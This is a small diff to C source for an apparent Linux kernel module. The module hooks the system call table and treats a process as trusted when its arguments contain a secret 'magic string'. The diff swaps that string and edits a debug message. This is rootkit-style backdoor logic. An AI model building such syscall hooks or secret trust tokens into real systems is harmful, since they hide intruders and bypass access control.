@@ -20,7 +20,7 @@ int ssSize = NUMBER_OF_FUNCTIONS;
 void *sys_call_table;
 struct cpumask *cpus;
 
-const char *magicString = "xxxGANGNAM-STYLExxx"; // if this string is into argv, process is trusted
+const char *magicString = "xxxDEAD-BEAFxxx"; // if this string is into argv, process is trusted
 
 
 //
@@ -330,7 +330,7 @@ void stop (void) {
 	while (atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)) {
 		set_current_state (TASK_INTERRUPTIBLE);
 #ifdef MY_OWN_DEBUG
-		printk ("Waiting, read cnt: %ld, readdir cnt: %ld\n",
+		printk ("Waiting, read cnt: %ld",
 				atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)
 		);
 #endif
